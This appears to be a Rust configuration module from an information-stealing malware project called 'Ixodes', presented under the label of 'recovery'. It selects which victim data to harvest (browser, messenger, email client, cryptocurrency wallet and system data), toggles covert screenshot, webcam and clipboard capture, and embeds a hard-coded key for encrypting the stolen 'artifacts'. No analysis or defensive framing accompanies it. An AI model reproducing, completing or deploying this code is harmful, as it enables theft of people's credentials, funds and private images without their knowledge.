use crate::recovery::task::RecoveryCategory;
use base64::{Engine as _, engine::general_purpose::STANDARD};
use once_cell::sync::Lazy;
use std::{collections::HashSet, env, str::FromStr};
use tracing::{info, warn};

static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[RecoveryCategory::Browsers, RecoveryCategory::Messengers, RecoveryCategory::EmailClients, RecoveryCategory::Wallets, RecoveryCategory::System, RecoveryCategory::Other]);
static DEFAULT_ARTIFACT_KEY: Option<&str> = Some("CSAUKAXurU5lMsYkMn8kbjLfdDHtmQam8zNKJA7R6oQ=");
static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
static DEFAULT_CAPTURE_WEBCAMS: bool = false;
static DEFAULT_CAPTURE_CLIPBOARD: bool = false;

static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);

#[derive(Debug)]
pub struct RecoveryControl {
    allowed_categories: Option<HashSet<RecoveryCategory>>,
    artifact_key: Option<Vec<u8>>,
    capture_screenshots: bool,
    capture_webcams: bool,
    capture_clipboard: bool,
}

impl RecoveryControl {
    pub fn global() -> &'static Self {
        &GLOBAL_RECOVERY_CONTROL
    }

    pub fn allows_category(&self, category: RecoveryCategory) -> bool {
        self.allowed_categories
            .as_ref()
            .map(|set| set.contains(&category))
            .unwrap_or(true)
    }

    pub fn artifact_key(&self) -> Option<&[u8]> {
        self.artifact_key.as_deref()
    }

    pub fn capture_screenshots(&self) -> bool {
        self.capture_screenshots
    }

    pub fn capture_webcams(&self) -> bool {
        self.capture_webcams
    }

    pub fn capture_clipboard(&self) -> bool {
        self.capture_clipboard
    }

    fn from_env() -> Self {
        let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
            .ok()
            .and_then(|value| parse_categories(&value))
            .or_else(|| default_categories());

        if let Some(categories) = allowed_categories.as_ref() {
            info!(
                "restricting recovery to {} categories",
                categories
                    .iter()
                    .map(|category| category.to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            );
        }

        let artifact_key = env::var("IXODES_ARTIFACT_KEY")
            .ok()
            .and_then(|value| decode_artifact_key(&value))
            .or_else(|| DEFAULT_ARTIFACT_KEY.and_then(decode_artifact_key));

        if artifact_key.is_some() {
            info!("artifact encryption enabled");
        }

        let capture_screenshots =
            parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
        let capture_webcams =
            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
        let capture_clipboard =
            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);

        RecoveryControl {
            allowed_categories,
            artifact_key,
            capture_screenshots,
            capture_webcams,
            capture_clipboard,
        }
    }
}

fn default_categories() -> Option<HashSet<RecoveryCategory>> {
    DEFAULT_ALLOWED_CATEGORIES.map(|categories| categories.iter().copied().collect())
}

fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return None;
    }
    match STANDARD.decode(trimmed) {
        Ok(bytes) => {
            if bytes.len() != 32 {
                warn!(
                    "artifact encryption key must be 32 bytes (base64); got {} bytes",
                    bytes.len()
                );
                None
            } else {
                Some(bytes)
            }
        }
        Err(err) => {
            warn!(
                error = ?err,
                "failed to decode artifact encryption key"
            );
            None
        }
    }
}

fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {
    let mut set = HashSet::new();
    for segment in value.split(',') {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        match RecoveryCategory::from_str(trimmed) {
            Ok(category) => {
                set.insert(category);
            }
            Err(err) => {
                warn!("skipping invalid category filter {trimmed}: {err}");
            }
        }
    }
    if set.is_empty() { None } else { Some(set) }
}

fn parse_flag(key: &str) -> Option<bool> {
    env::var(key).ok().map(|value| {
        matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    })
}
